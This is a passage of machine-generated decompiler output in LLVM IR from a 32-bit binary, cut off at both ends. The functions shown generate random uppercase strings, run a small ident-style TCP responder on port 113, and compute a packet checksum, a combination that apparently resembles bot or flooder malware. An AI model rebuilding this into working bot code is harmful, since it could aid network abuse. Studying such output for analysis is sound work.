  %v2_8048414 = call i32 @function_804d42f(i32 %v1_80483ee)
  br label %dec_label_pc_8048452

dec_label_pc_8048421:                             ; preds = %dec_label_pc_8048401
  %v1_8048421 = call i32 @function_804e9f8(i32 %tmp)
  %v0_8048428 = load i64, i64* @global_var_80560ec.12, align 8
  %sext = mul i64 %v0_8048428, 4294967296
  %v5_804842d = sdiv i64 %sext, 4294967296
  %v6_8048437 = zext i32 %v1_8048421 to i64
  %v14_8048437 = urem i64 %v6_8048437, %v5_804842d
  %v15_8048437 = trunc i64 %v14_8048437 to i32
  %v0_804843a = load i8*, i8** @global_var_80560e8.11, align 4
  %v1_804843a = ptrtoint i8* %v0_804843a to i32
  %v2_804843f = add i32 %v15_8048437, 1
  %v1_8048442 = add i32 %v2_804843f, %v1_804843a
  %v2_8048447 = call i32 @function_804d42f(i32 %v1_8048442)
  br label %dec_label_pc_8048452

dec_label_pc_8048452:                             ; preds = %dec_label_pc_804840b, %dec_label_pc_80483f7, %dec_label_pc_8048421
  %stack_var_-8.0 = phi i32 [ %v2_8048447, %dec_label_pc_8048421 ], [ %v2_8048414, %dec_label_pc_804840b ], [ %v1_80483f7, %dec_label_pc_80483f7 ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @function_804d42f, { 1, 0 }
  uselistorder label %dec_label_pc_8048452, { 2, 0, 1 }
}

define i32 @function_8048457(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048457:
  %v4_804847f = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804847f

dec_label_pc_8048460:                             ; preds = %dec_label_pc_80484a1, %dec_label_pc_804847f
  %v3_8048471 = call i32 @_strlen(i8* %arg1)
  %v6_8048478 = add i32 %v4_804847f, %v3_8048471
  %v1_804847b = add i32 %v6_8048478, -1
  %v1_804847c = inttoptr i32 %v1_804847b to i8*
  store i8 0, i8* %v1_804847c, align 1
  br label %dec_label_pc_804847f

dec_label_pc_804847f:                             ; preds = %dec_label_pc_8048457, %dec_label_pc_8048460
  %v3_8048490 = call i32 @_strlen(i8* %arg1)
  %v6_8048497 = add i32 %v4_804847f, %v3_8048490
  %v1_804849a = add i32 %v6_8048497, -1
  %v1_804849b = inttoptr i32 %v1_804849a to i8*
  %v2_804849b = load i8, i8* %v1_804849b, align 1
  %v10_804849d = icmp eq i8 %v2_804849b, 13
  br i1 %v10_804849d, label %dec_label_pc_8048460, label %dec_label_pc_80484a1

dec_label_pc_80484a1:                             ; preds = %dec_label_pc_804847f
  %v3_80484b2 = call i32 @_strlen(i8* %arg1)
  %v6_80484b9 = add i32 %v4_804847f, %v3_80484b2
  %v1_80484bc = add i32 %v6_80484b9, -1
  %v1_80484bd = inttoptr i32 %v1_80484bc to i8*
  %v2_80484bd = load i8, i8* %v1_80484bd, align 1
  %v11_80484bf = icmp eq i8 %v2_80484bd, 10
  br i1 %v11_80484bf, label %dec_label_pc_8048460, label %dec_label_pc_80484c3

dec_label_pc_80484c3:                             ; preds = %dec_label_pc_80484a1
  %v1_80484c8 = sext i8 %v2_80484bd to i32
  ret i32 %v1_80484c8

; uselistorder directives
  uselistorder i32 %v4_804847f, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804847f, { 1, 0 }
}

define i32 @function_80484c9() local_unnamed_addr {
dec_label_pc_80484c9:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v0_80484ce = load i32, i32* @ebx, align 4
  %v1_80484d5 = call i32 @function_804e9f8(i32 %v0_80484ce)
  %v2_80484e5 = ashr i32 %v1_80484d5, 31
  %v2_80484e8 = zext i32 %v1_80484d5 to i64
  %v4_80484e8 = zext i32 %v2_80484e5 to i64
  %v5_80484e8 = mul nuw i64 %v4_80484e8, 4294967296
  %v6_80484e8 = or i64 %v5_80484e8, %v2_80484e8
  %v10_80484e8 = srem i64 %v6_80484e8, 5
  %v11_80484e8 = trunc i64 %v10_80484e8 to i32
  %v1_80484ec = add i32 %v11_80484e8, 4
  %v1_80484f5 = add i32 %v11_80484e8, 5
  %v2_80484fa = call i32 @function_804da52(i32 %v1_80484f5)
  %tmp21 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_80484fa, i32* %tmp21, align 4
  %tmp22 = inttoptr i32 %v2_80484fa to i8*
  store i32 %v2_80484fa, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048513 = and i32 %v2_80484fa, -256
  store i32 %v1_8048513, i32* @eax, align 4
  %v5_8048515 = call i8* @_memset(i8* %tmp22, i32 %v1_8048513, i32 %v1_80484f5)
  %v3_8048524 = call i32 @function_804b888(i32 ptrtoint ([16 x i8]* @global_var_8052510.14 to i32), i32 ptrtoint (i32* @global_var_805250e.13 to i32))
  store i32 %v3_8048524, i32* @eax, align 4
  %v4_804852f = icmp eq i32 %v3_8048524, 0
  %v1_8048533 = icmp eq i1 %v4_804852f, false
  br i1 %v1_8048533, label %dec_label_pc_8048572, label %dec_label_pc_8048565.preheader

dec_label_pc_8048565.preheader:                   ; preds = %dec_label_pc_80484c9
  %v5_804856b31 = icmp sgt i32 %v1_80484ec, 0
  br i1 %v5_804856b31, label %dec_label_pc_804853e, label %dec_label_pc_804862b

dec_label_pc_804853e:                             ; preds = %dec_label_pc_804853e, %dec_label_pc_8048565.preheader
  %v4_8048543 = phi i8* [ %tmp22, %dec_label_pc_8048565.preheader ], [ %v3_804862b.pre.pre, %dec_label_pc_804853e ]
  %storemerge32 = phi i32 [ 0, %dec_label_pc_8048565.preheader ], [ %v4_8048562, %dec_label_pc_804853e ]
  store i32 %storemerge32, i32* @eax, align 4
  %v5_8048543 = ptrtoint i8* %v4_8048543 to i32
  %v6_8048543 = add i32 %v5_8048543, %storemerge32
  store i32 %v6_8048543, i32* @ebx, align 4
  %v1_8048546 = call i32 @function_804e9f8(i32 %storemerge32)
  %v2_8048556 = ashr i32 %v1_8048546, 31
  %v2_8048559 = zext i32 %v1_8048546 to i64
  %v4_8048559 = zext i32 %v2_8048556 to i64
  %v5_8048559 = mul nuw i64 %v4_8048559, 4294967296
  %v6_8048559 = or i64 %v5_8048559, %v2_8048559
  %v10_8048559 = srem i64 %v6_8048559, 26
  %v11_8048559 = trunc i64 %v10_8048559 to i8
  %v1_804855d = add i8 %v11_8048559, 65
  %v2_8048560 = load i32, i32* @ebx, align 4
  %v3_8048560 = inttoptr i32 %v2_8048560 to i8*
  store i8 %v1_804855d, i8* %v3_8048560, align 1
  %v4_8048562 = add nuw nsw i32 %storemerge32, 1
  %exitcond33 = icmp eq i32 %v4_8048562, %v1_80484ec
  %v3_804862b.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond33, label %dec_label_pc_804862b, label %dec_label_pc_804853e

dec_label_pc_8048572:                             ; preds = %dec_label_pc_80484c9
  %v1_8048572 = call i32 @function_804e9f8(i32 %v3_8048524)
  store i32 %v1_8048572, i32* @eax, align 4
  store i32 %v1_8048572, i32* @ebx, align 4
  %v1_8048579 = call i32 @function_804e9f8(i32 %tmp6)
  %v2_8048579 = sext i32 %v1_8048579 to i64
  %v0_804857e = load i32, i32* @ebx, align 4
  %v3_8048580 = sext i32 %v0_804857e to i64
  %v5_8048580 = mul nsw i64 %v3_8048580, %v2_8048579
  %v6_8048580 = trunc i64 %v5_8048580 to i32
  %v2_804858c = ashr i32 %v6_8048580, 31
  %v2_804858f = and i64 %v5_8048580, 4294967295
  %v4_804858f = zext i32 %v2_804858c to i64
  %v5_804858f = mul nuw i64 %v4_804858f, 4294967296
  %v6_804858f = or i64 %v5_804858f, %v2_804858f
  %v10_804858f = srem i64 %v6_804858f, 45402
  %v11_804858f = trunc i64 %v10_804858f to i32
  store i32 %v11_804858f, i32* @edx, align 4
  %v1_8048593 = add i32 %v11_804858f, 1
  %v2_80485ab = ptrtoint i32* %stack_var_-1060 to i32
  %tmp23 = bitcast i32* %stack_var_-1060 to i8*
  %v5_80485c327 = icmp sgt i32 %v1_8048593, 0
  br i1 %v5_80485c327, label %dec_label_pc_80485a0, label %dec_label_pc_80485c5

dec_label_pc_80485a0:                             ; preds = %dec_label_pc_8048572, %dec_label_pc_80485a0
  %storemerge428 = phi i32 [ %v4_80485ba, %dec_label_pc_80485a0 ], [ 0, %dec_label_pc_8048572 ]
  %v4_80485b2 = call i32 @function_804cbf4(i32 %v2_80485ab, i32 1024, i32 %v3_8048524)
  %v4_80485ba = add nuw nsw i32 %storemerge428, 1
  %exitcond = icmp eq i32 %v4_80485ba, %v1_8048593
  br i1 %exitcond, label %dec_label_pc_80485c5, label %dec_label_pc_80485a0

dec_label_pc_80485c5:                             ; preds = %dec_label_pc_8048572, %dec_label_pc_80485a0
  store i32 %v2_80485ab, i32* @edx, align 4
  %v5_80485d9 = call i32 @function_804d178(i8* %tmp23, i32 0, i32 1024)
  %v4_80485f3 = call i32 @function_804cbf4(i32 %v2_80485ab, i32 1024, i32 %v3_8048524)
  %v2_8048602 = call i32 @function_8048457(i8* %tmp23)
  store i32 %v2_80484fa, i32* @eax, align 4
  store i32 %v2_80484fa, i32* @edi, align 4
  store i32 %v2_80485ab, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804861b = call i8* @_memcpy(i8* %tmp22, i8* %tmp23, i32 %v1_80484ec)
  %v8_804861b = ptrtoint i8* %v7_804861b to i32
  store i32 %v8_804861b, i32* @ecx, align 4
  %tmp24 = inttoptr i32 %v3_8048524 to i16*
  %v3_8048623 = call i32 @function_804b77c(i16* %tmp24)
  br label %dec_label_pc_804862b

dec_label_pc_804862b:                             ; preds = %dec_label_pc_804853e, %dec_label_pc_8048565.preheader, %dec_label_pc_80485c5
  %v3_804862b = phi i8* [ %tmp22, %dec_label_pc_80485c5 ], [ %tmp22, %dec_label_pc_8048565.preheader ], [ %v3_804862b.pre.pre, %dec_label_pc_804853e ]
  %v4_804862b = ptrtoint i8* %v3_804862b to i32
  ret i32 %v4_804862b

; uselistorder directives
  uselistorder i32 %v4_80485ba, { 1, 0 }
  uselistorder i8* %tmp23, { 2, 1, 0 }
  uselistorder i32 %v2_80485ab, { 2, 1, 0, 3 }
  uselistorder i32 %v4_8048562, { 1, 0 }
  uselistorder i32 %storemerge32, { 2, 1, 3, 0 }
  uselistorder i32 %v3_8048524, { 2, 1, 0, 3, 4, 5 }
  uselistorder i8* %tmp22, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_80484f5, { 1, 0 }
  uselistorder i32 %v1_80484ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804862b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80485c5, { 1, 0 }
  uselistorder label %dec_label_pc_80485a0, { 1, 0 }
}

define i32 @function_8048636() local_unnamed_addr {
dec_label_pc_8048636:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_8048649 = call i32 @function_804da00(i32 2, i32 1, i32 0)
  %v13_8048654 = icmp eq i32 %v3_8048649, -1
  br i1 %v13_8048654, label %dec_label_pc_8048873, label %dec_label_pc_804865e

dec_label_pc_804865e:                             ; preds = %dec_label_pc_8048636
  store i32 2, i32* %stack_var_-52, align 4
  %v1_8048669 = call i32 @function_804d410(i32 113)
  %v2_804867c = ptrtoint i32* %stack_var_-52 to i32
  %v3_804869b = call i32 @function_804d8d0(i32 %v3_8048649, i32 %v2_804867c, i32 16)
  %v10_80486a3 = icmp eq i32 %v3_804869b, -1
  br i1 %v10_80486a3, label %dec_label_pc_8048873, label %dec_label_pc_80486ac

dec_label_pc_80486ac:                             ; preds = %dec_label_pc_804865e
  %v2_80486b4 = call i32 @function_804d928(i32 %v3_8048649, i32 1)
  %v10_80486bc = icmp eq i32 %v2_80486b4, -1
  br i1 %v10_80486bc, label %dec_label_pc_8048873, label %dec_label_pc_80486c5

dec_label_pc_80486c5:                             ; preds = %dec_label_pc_80486ac
  %v0_80486c5 = call i32 @function_804b4d4()
  %v1_80486ca = icmp eq i32 %v0_80486c5, 0
  br i1 %v1_80486ca, label %dec_label_pc_8048873, label %dec_label_pc_80486d2

dec_label_pc_80486d2:                             ; preds = %dec_label_pc_80486c5
  store i32 16, i32* %stack_var_-36, align 4
  %v2_80486d9 = ptrtoint i32* %stack_var_-36 to i32
  %v2_80486dc = ptrtoint i32* %stack_var_-68 to i32
  %v3_80486e7 = call i32 @function_804d8a4(i32 %v3_8048649, i32 %v2_80486dc, i32 %v2_80486d9)
  store i32 %v3_80486e7, i32* @eax, align 4
  %v4_80486f2 = add i32 %v3_80486e7, 1
  %v13_80486f2 = icmp eq i32 %v4_80486f2, 0
  %v1_80486f6 = icmp eq i1 %v13_80486f2, false
  br i1 %v1_80486f6, label %dec_label_pc_8048702.preheader, label %dec_label_pc_80486f8

dec_label_pc_80486f8:                             ; preds = %dec_label_pc_80486d2
  %v1_80486fd = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_8048702.preheader

dec_label_pc_8048702.preheader:                   ; preds = %dec_label_pc_80486f8, %dec_label_pc_80486d2
  %v2_804870c = ptrtoint i32* %stack_var_-1228 to i32
  %tmp33 = bitcast i32* %stack_var_-1228 to i8*
  %v2_8048720 = udiv i32 %v3_80486e7, 32
  %v1_8048726 = urem i32 %v3_80486e7, 32
  %v9_8048729 = shl i32 1, %v1_8048726
  %v2_804874e = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048785 = mul nuw nsw i32 %v2_8048720, 4
  %v3_8048785 = add nsw i32 %v2_8048785, -1224
  br label %dec_label_pc_8048702

dec_label_pc_8048702:                             ; preds = %dec_label_pc_8048702.preheader, %dec_label_pc_8048777
  store i32 %v2_804870c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048713 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  %v0_8048729 = load i32, i32* @ebp, align 4
  %v4_8048729 = add i32 %v3_8048785, %v0_8048729
  %v5_8048729 = inttoptr i32 %v4_8048729 to i32*
  %v6_8048729 = load i32, i32* %v5_8048729, align 4
  %v12_8048729 = or i32 %v6_8048729, %v9_8048729
  store i32 %v12_8048729, i32* %v5_8048729, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_8048761 = call i32 @function_804b690(i32 %v4_80486f2, i32 %v2_804870c, i32 0, i32 0, i32 %v2_804874e)
  store i32 %v6_8048761, i32* @eax, align 4
  %v2_8048769 = icmp slt i32 %v6_8048761, 0
  %v1_804876b = icmp eq i1 %v2_8048769, false
  br i1 %v1_804876b, label %dec_label_pc_8048777, label %dec_label_pc_804876d

dec_label_pc_804876d:                             ; preds = %dec_label_pc_8048702
  %v1_8048772 = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_8048702, %dec_label_pc_804876d
  %v0_8048785 = load i32, i32* @ebp, align 4
  %v4_8048785 = add i32 %v3_8048785, %v0_8048785
  %v5_8048785 = inttoptr i32 %v4_8048785 to i32*
  %v6_8048785 = load i32, i32* %v5_8048785, align 4
  %v10_8048785 = and i32 %v6_8048785, %v9_8048729
  %v11_8048785 = icmp ne i32 %v10_8048785, 0
  %v4_8048790 = icmp eq i1 %v11_8048785, false
  %v1_8048792 = icmp eq i1 %v4_8048790, false
  br i1 %v1_8048792, label %dec_label_pc_8048799, label %dec_label_pc_8048702

dec_label_pc_8048799:                             ; preds = %dec_label_pc_8048777
  %v2_80487a0 = ptrtoint i32* %stack_var_-1092 to i32
  %v5_80487aa = call i32 @function_804d94c(i32 %v3_80486e7, i32 %v2_80487a0, i32 1024, i32 0)
  store i32 %v5_80487aa, i32* @eax, align 4
  %tmp34 = icmp slt i32 %v5_80487aa, 1
  br i1 %tmp34, label %dec_label_pc_80487c1, label %dec_label_pc_80487bb

dec_label_pc_80487bb:                             ; preds = %dec_label_pc_8048799
  %v7_80487bf = icmp sgt i32 %v5_80487aa, 19
  br i1 %v7_80487bf, label %dec_label_pc_80487c1, label %dec_label_pc_80487cb

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_80487bb, %dec_label_pc_8048799
  %v1_80487c6 = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_80487cb

dec_label_pc_80487cb:                             ; preds = %dec_label_pc_80487bb, %dec_label_pc_80487c1
  %v0_80487ce = load i32, i32* @ebp, align 4
  %v2_80487ce = add i32 %v5_80487aa, -1088
  %v3_80487ce = add i32 %v2_80487ce, %v0_80487ce
  %v4_80487ce = inttoptr i32 %v3_80487ce to i8*
  store i8 0, i8* %v4_80487ce, align 1
  %v0_80487da = load i32, i32* @ebp, align 4
  %v2_80487da = add i32 %v5_80487aa, -1089
  %v3_80487da = add i32 %v2_80487da, %v0_80487da
  %v4_80487da = inttoptr i32 %v3_80487da to i8*
  %v5_80487da = load i8, i8* %v4_80487da, align 1
  %v10_80487e1 = icmp eq i8 %v5_80487da, 10
  br i1 %v10_80487e1, label %dec_label_pc_80487f4, label %dec_label_pc_80487e5

dec_label_pc_80487e5:                             ; preds = %dec_label_pc_80487cb
  %v5_80487e9 = load i8, i8* %v4_80487da, align 1
  %v10_80487f0 = icmp eq i8 %v5_80487e9, 13
  %v1_80487f2 = icmp eq i1 %v10_80487f0, false
  br i1 %v1_80487f2, label %dec_label_pc_8048800, label %dec_label_pc_80487f4

dec_label_pc_80487f4:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_80487cb
  store i8 0, i8* %v4_80487da, align 1
  %v0_8048806.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8048800

dec_label_pc_8048800:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_80487f4
  %v0_8048828 = phi i32 [ %v0_80487da, %dec_label_pc_80487e5 ], [ %v0_8048806.pre, %dec_label_pc_80487f4 ]
  %v2_8048806 = add i32 %v5_80487aa, -1090
  %v3_8048806 = add i32 %v2_8048806, %v0_8048828
  %v4_8048806 = inttoptr i32 %v3_8048806 to i8*
  %v5_8048806 = load i8, i8* %v4_8048806, align 1
  %v10_804880d = icmp eq i8 %v5_8048806, 10
  br i1 %v10_804880d, label %dec_label_pc_8048822, label %dec_label_pc_8048811

dec_label_pc_8048811:                             ; preds = %dec_label_pc_8048800
  %v5_8048817 = load i8, i8* %v4_8048806, align 1
  %v10_804881e = icmp eq i8 %v5_8048817, 13
  %v1_8048820 = icmp eq i1 %v10_804881e, false
  br i1 %v1_8048820, label %dec_label_pc_8048830, label %dec_label_pc_8048822

dec_label_pc_8048822:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_8048800
  store i8 0, i8* %v4_8048806, align 1
  br label %dec_label_pc_8048830

dec_label_pc_8048830:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_8048822
  %v3_8048845 = call i32 @function_80482b2(i32 %v3_80486e7, i32 ptrtoint ([25 x i8]* @global_var_8052520.16 to i32))
  %v1_8048853 = call i32 @function_804b4a4(i32 %v3_80486e7)
  %v1_8048861 = call i32 @function_804b4a4(i32 %v3_8048649)
  store i32 %v1_8048861, i32* @eax, align 4
  %v1_804886e = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_8048873

dec_label_pc_8048873:                             ; preds = %dec_label_pc_80486c5, %dec_label_pc_80486ac, %dec_label_pc_804865e, %dec_label_pc_8048636, %dec_label_pc_8048830
  %v0_8048877 = phi i32 [ 0, %dec_label_pc_80486c5 ], [ -1, %dec_label_pc_80486ac ], [ -1, %dec_label_pc_804865e ], [ -1, %dec_label_pc_8048636 ], [ %v1_804886e, %dec_label_pc_8048830 ]
  ret i32 %v0_8048877

; uselistorder directives
  uselistorder i32 %v5_80487aa, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %v3_8048785, { 1, 0 }
  uselistorder i32 %v3_80486e7, { 2, 3, 4, 1, 0, 5, 6 }
  uselistorder i32 %v3_8048649, { 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32 ()* @function_804b4d4, { 1, 0 }
  uselistorder label %dec_label_pc_8048873, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8048830, { 1, 0 }
  uselistorder label %dec_label_pc_8048800, { 1, 0 }
  uselistorder label %dec_label_pc_80487cb, { 1, 0 }
  uselistorder label %dec_label_pc_8048777, { 1, 0 }
  uselistorder label %dec_label_pc_8048702, { 1, 0 }
}

define i32 @function_8048878(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048878:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048878 = load i32, i32* @ebp, align 4
  store i32 %v0_8048878, i32* %stack_var_-4, align 4
  %v4_8048878 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048878, i32* @ebp, align 4
  %v4_804887e = icmp eq i32 %arg2, 0
  %v1_8048882 = icmp eq i1 %v4_804887e, false
  br i1 %v1_8048882, label %dec_label_pc_804888d, label %dec_label_pc_8048884

dec_label_pc_8048884:                             ; preds = %dec_label_pc_8048878
  br label %dec_label_pc_80488b7

dec_label_pc_804888d:                             ; preds = %dec_label_pc_8048878
  %v4_804888d = add i32 %arg2, -1
  %v12_804888d = icmp eq i32 %v4_804888d, 0
  %v1_8048891 = icmp eq i1 %v12_804888d, false
  br i1 %v1_8048891, label %dec_label_pc_804889b, label %dec_label_pc_8048893

dec_label_pc_8048893:                             ; preds = %dec_label_pc_804888d
  %v4_8048893 = trunc i64 %arg1 to i32
  br label %dec_label_pc_80488b7

dec_label_pc_804889b:                             ; preds = %dec_label_pc_804888d
  %v4_80488a6 = call i32 @function_8048878(i64 %arg1, i32 %v4_804888d)
  %v6_80488b0 = sext i32 %v4_80488a6 to i64
  %v8_80488b0 = mul nsw i64 %v6_80488b0, %arg1
  %v9_80488b0 = trunc i64 %v8_80488b0 to i32
  br label %dec_label_pc_80488b7

dec_label_pc_80488b7:                             ; preds = %dec_label_pc_8048893, %dec_label_pc_8048884, %dec_label_pc_804889b
  %v3_80488b7.off0 = phi i32 [ %v4_8048893, %dec_label_pc_8048893 ], [ 1, %dec_label_pc_8048884 ], [ %v9_80488b0, %dec_label_pc_804889b ]
  ret i32 %v3_80488b7.off0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80488b7, { 2, 0, 1 }
}

define i32 @function_80488bc(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80488bc:
  %v0_80488bc = load i32, i32* @ebp, align 4
  %v4_80488f323 = add i32 %arg2, -1
  %v9_80488f324 = sub i32 0, %arg2
  %v10_80488f325 = and i32 %arg2, %v9_80488f324
  %v11_80488f326 = icmp slt i32 %v10_80488f325, 0
  %v12_80488f327 = icmp eq i32 %v4_80488f323, 0
  %v13_80488f328 = icmp slt i32 %v4_80488f323, 0
  %v3_80488f729 = icmp eq i1 %v13_80488f328, %v11_80488f326
  %v4_80488f730 = icmp eq i1 %v12_80488f327, false
  %v5_80488f731 = and i1 %v4_80488f730, %v3_80488f729
  br i1 %v5_80488f731, label %dec_label_pc_80488dd, label %dec_label_pc_80488f9

dec_label_pc_80488dd:                             ; preds = %dec_label_pc_80488bc, %dec_label_pc_80488dd
  %stack_var_-24.034 = phi i16 [ %v6_80488e8, %dec_label_pc_80488dd ], [ 0, %dec_label_pc_80488bc ]
  %stack_var_-28.033 = phi i16* [ %v23_80488eb, %dec_label_pc_80488dd ], [ %arg1, %dec_label_pc_80488bc ]
  %v3_80488ef32 = phi i32 [ %v4_80488ef, %dec_label_pc_80488dd ], [ %arg2, %dec_label_pc_80488bc ]
  %v4_80488dd = ptrtoint i16* %stack_var_-28.033 to i32
  %v2_80488e0 = load i16, i16* %stack_var_-28.033, align 2
  %v6_80488e8 = add i16 %v2_80488e0, %stack_var_-24.034
  %v5_80488eb = add i32 %v4_80488dd, 2
  %v23_80488eb = inttoptr i32 %v5_80488eb to i16*
  %v4_80488ef = add i32 %v3_80488ef32, -2
  %v4_80488f3 = add i32 %v3_80488ef32, -3
  %v9_80488f3 = sub i32 2, %v3_80488ef32
  %v10_80488f3 = and i32 %v4_80488ef, %v9_80488f3
  %v11_80488f3 = icmp slt i32 %v10_80488f3, 0
  %v12_80488f3 = icmp eq i32 %v4_80488f3, 0
  %v13_80488f3 = icmp slt i32 %v4_80488f3, 0
  %v3_80488f7 = icmp eq i1 %v13_80488f3, %v11_80488f3
  %v4_80488f7 = icmp eq i1 %v12_80488f3, false
  %v5_80488f7 = and i1 %v4_80488f7, %v3_80488f7
  br i1 %v5_80488f7, label %dec_label_pc_80488dd, label %dec_label_pc_80488f9

dec_label_pc_80488f9:                             ; preds = %dec_label_pc_80488dd, %dec_label_pc_80488bc
  %stack_var_-28.0.lcssa = phi i16* [ %arg1, %dec_label_pc_80488bc ], [ %v23_80488eb, %dec_label_pc_80488dd ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %dec_label_pc_80488bc ], [ %v6_80488e8, %dec_label_pc_80488dd ]
  %v4_80488f7.lcssa = phi i1 [ %v4_80488f730, %dec_label_pc_80488bc ], [ %v4_80488f7, %dec_label_pc_80488dd ]
  br i1 %v4_80488f7.lcssa, label %dec_label_pc_8048915, label %dec_label_pc_80488ff

dec_label_pc_80488ff:                             ; preds = %dec_label_pc_80488f9
  %v4_8048902 = ptrtoint i16* %stack_var_-28.0.lcssa to i32
  %v1_8048905 = bitcast i16* %stack_var_-28.0.lcssa to i8*
  %v2_8048905 = load i8, i8* %v1_8048905, align 1
  %v3_8048905 = zext i8 %v2_8048905 to i32
  %v5_8048905 = and i32 %v4_8048902, -256
  %v6_8048905 = or i32 %v3_8048905, %v5_8048905
  %v4_804890910 = urem i32 %v6_8048905, 65536
  %v4_804891241 = zext i16 %stack_var_-24.0.lcssa to i32
  %v6_8048912 = add nuw nsw i32 %v4_804890910, %v4_804891241
  %v26_8048912 = trunc i32 %v6_8048912 to i16
  br label %dec_label_pc_8048915

dec_label_pc_8048915:                             ; preds = %dec_label_pc_80488f9, %dec_label_pc_80488ff
  %stack_var_-24.1 = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_80488f9 ], [ %v26_8048912, %dec_label_pc_80488ff ]
  %v4_8048915 = sext i16 %stack_var_-24.1 to i32
  %v2_8048918 = sdiv i32 %v4_8048915, 65536
  %v2_804891f = add nsw i32 %v2_8048918, %v4_8048915
  %sext4 = mul i32 %v2_804891f, 65536
  %v2_8048927 = ashr i32 %sext4, 31
  %v6_804892a12 = mul nsw i32 %v2_8048927, 65536
  %v4_80489241113 = add i32 %v6_804892a12, %sext4
  %v4_804892d22 = udiv i32 %v4_80489241113, 65536
  %v1_804893a = xor i32 %v4_804892d22, 65535
  store i32 %v0_80488bc, i32* @ebp, align 4
  ret i32 %v1_804893a

; uselistorder directives
  uselistorder i32 %sext4, { 1, 0 }
  uselistorder i32 %v4_8048915, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v4_80488f3, { 1, 0 }
  uselistorder i32 %v4_80488ef, { 1, 0 }
  uselistorder label %dec_label_pc_8048915, { 1, 0 }
  uselistorder label %dec_label_pc_80488dd, { 1, 0 }
}

define i32 @function_8048941(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8048941:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-5192 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-1096 = alloca i32, align 4
  %stack_var_-5244 = alloca i32, align 4
  %stack_var_-5228 = alloca i32, align 4
  %v12_8048946 = ptrtoint i32* %stack_var_-5228 to i32
  %v5_804894c = icmp ult i32* %stack_var_-5228, inttoptr (i32 12 to i32*)
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
  store i32 %arg2, i32* %stack_var_-5244, align 4
  %v1_8048952 = call i32 @function_8048309(i32 %arg2)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804895a = icmp eq i32 %v1_8048952, 0
  %v1_804895c = icmp eq i1 %v1_804895a, false
  br i1 %v1_804895c, label %dec_label_pc_8048e1a, label %dec_label_pc_8048962

dec_label_pc_8048962:                             ; preds = %dec_label_pc_8048941
  %v4_8048962 = add i32 %arg3, -1
  %v8_8048962 = icmp eq i32 %arg3, 0
  %v9_8048962 = sub i32 0, %arg3
  %v10_8048962 = and i32 %arg3, %v9_8048962
  %v11_8048962 = icmp slt i32 %v10_8048962, 0
  store i1 %v8_8048962, i1* %cf.global-to-local, align 1
  %v12_8048962 = icmp eq i32 %v4_8048962, 0
  %v13_8048962 = icmp slt i32 %v4_8048962, 0
  %v3_8048966 = icmp eq i1 %v13_8048962, %v11_8048962
  %v4_8048966 = icmp eq i1 %v12_8048962, false
  %v5_8048966 = and i1 %v4_8048966, %v3_8048966
  br i1 %v5_8048966, label %dec_label_pc_8048988, label %dec_label_pc_8048968

dec_label_pc_8048968:                             ; preds = %dec_label_pc_8048962
  %v5_8048968 = icmp ult i32* %stack_var_-5228, inttoptr (i32 4 to i32*)
  store i1 %v5_8048968, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %stack_var_-5244, align 4
  %v3_8048976 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_805253c.17 to i32))
  store i32 %v3_8048976, i32* @eax, align 4
  store i1 %v5_804894c, i1* %cf.global-to-local, align 1
